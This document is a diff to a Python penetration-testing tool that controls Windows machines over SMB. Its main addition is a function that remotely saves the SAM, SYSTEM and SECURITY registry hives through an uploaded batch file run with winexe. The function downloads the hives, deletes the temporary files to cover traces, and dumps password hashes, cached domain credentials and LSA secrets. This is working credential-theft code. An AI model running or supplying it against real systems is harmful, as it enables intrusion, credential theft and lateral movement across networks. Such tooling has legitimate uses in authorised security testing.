@@ -221,7 +221,7 @@ def creds_from_vault():
 	(count,) = res.fetchone()
 
 	if count == 0:
-		text("[!] No credentials to use. Use the smb_creds command to add some.", 1)
+		text("[!] No credentials to use. Use the %s creds command to add some." % sys.argv[0], 1)
 
 	res = cursor.execute("SELECT username, password, ntlm_hash FROM creds WHERE active=1 LIMIT 1")
 
@@ -353,7 +353,7 @@ def winexe(cmd):
 	return ''
 
 def os_architecture():
-	return 32 if 'NO_SUCH_FILE' in smbclient('dir "\Program Files (x86)"') else 64
+	return 32 if 'NO_SUCH_FILE' in smbclient('dir "\\Program Files (x86)"') else 64
 
 def screen_resolution():
 	xrandr = subprocess.Popen(['xrandr', '--current'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.readlines()
@@ -534,6 +534,80 @@ def smb_download():
 		usage()
 
 	print smbclient('get "%s" "%s"' % (sys.argv[3], sys.argv[4]))
+
+def smb_creddump():
+	"""
+	[-s] <ip> [ user ] [ password | ntlm_hash ]
+	Extract SAM, SECURITY, SYSTEM hives and dump SAM, DCC, LSA Secrets
+	"""
+
+	try:
+		sys.path.insert(0, BASEDIR + '/creddump')
+		from framework.win32 import hashdump, domcachedump, lsasecrets
+	except:
+		text("[!] Error: Creddump dependency missing.", 1)
+
+	set_creds(3)
+
+	text("[*] Extracting hives...")
+
+	tmpfile = '/tmp/cred_run.bat'
+
+	bat = ['@echo off', 'cd \\windows\\temp', 
+		'reg save HKLM\\SAM sam.hive /y',
+		'reg save HKLM\\SYSTEM system.hive /y',
+		'reg save HKLM\\SECURITY security.hive /y']
+
+	open(tmpfile, 'w').write('\r\n'.join(bat))
+
+	smbclient('put "%s" "\\windows\\temp\\cred_run.bat"' % tmpfile)
+	print winexe('\\windows\\temp\\cred_run.bat')
+
+	text("[*] Downloading hives...")
+	smbclient('get "\\windows\\temp\\sam.hive" "%s_sam.hive"' % CONF['smb_ip'])
+	smbclient('get "\\windows\\temp\\system.hive" "%s_system.hive"' % CONF['smb_ip'])
+	smbclient('get "\\windows\\temp\\security.hive" "%s_security.hive"' % CONF['smb_ip'])
+
+	text("[*] Removing temp files...")
+	smbclient('del "\\windows\\temp\\cred_run.bat"')
+	smbclient('del "\\windows\\temp\\sam.hive"')
+	smbclient('del "\\windows\\temp\\system.hive"')
+	smbclient('del "\\windows\\temp\\security.hive"')
+	os.unlink(tmpfile)
+
+	text("[*] Extracting SAM credentials...")
+	hashdump.dump_file_hashes(CONF['smb_ip'] + '_system.hive', CONF['smb_ip'] + '_sam.hive')
+
+	text("[*] Extracting MSCASH credentials...")
+	domcachedump.dump_file_hashes(CONF['smb_ip'] + '_system.hive', CONF['smb_ip'] + '_security.hive')
+
+	# Code below ripped from creddump's lsadump.py
+	text("[*] Extracting LSA Secrets...")
+	try:
+		FILTER = ''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])
+		secrets = lsasecrets.get_file_secrets(CONF['smb_ip'] + '_system.hive', CONF['smb_ip'] + '_security.hive')
+
+		if not secrets:
+			text("[!] Unable to read LSA secrets.")
+
+		else:
+			for k in secrets:
+				N = 0
+				length = 16
+				result = ''
+				while secrets[k]:
+					s, secrets[k] = secrets[k][:length],secrets[k][length:]
+					hexa = ' '.join(["%02X" % ord(x) for x in s])
+					s = s.translate(FILTER)
+					result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
+					N += length
+				
+				print k
+				print result
+	except:
+		pass
+
+	text("[*] Done.")
 
 def smb_scrshot():
 	"""
@@ -874,4 +948,4 @@ def smb_hash():
 	print ntlm_hash(sys.argv[2])
 
 if __name__ == "__main__":
-	main()
+	main() 
